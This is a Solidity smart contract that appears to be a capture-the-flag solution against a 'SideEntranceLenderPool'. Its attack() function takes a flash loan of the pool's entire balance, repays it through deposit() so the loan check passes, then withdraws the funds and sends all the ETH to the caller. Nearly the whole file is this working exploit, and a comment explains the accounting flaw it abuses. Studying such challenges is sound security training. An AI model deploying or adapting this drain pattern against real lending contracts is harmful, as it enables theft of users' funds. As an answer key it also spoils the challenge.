// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256) external;
}

contract FlashLoanEtherReceiver {
    ISideEntranceLenderPool target;

    /*
    Calling flashLoan() we can return ETH using deposit function.
    Later this allows us to withdraw them and 
    `if (address(this).balance < balanceBefore)` is passed inside flashLoan()
    */

    constructor(ISideEntranceLenderPool _target) {
        target = _target;
    }

    function execute() external payable {
        target.deposit{value: msg.value}();
    }

    function attack() public {
        uint256 targetBalance = address(target).balance;
        target.flashLoan(targetBalance);
        target.withdraw();
        payable(msg.sender).call{value: address(this).balance}("");
    }

    // needed to accept ETH from withdraw()
    receive() external payable {}
}
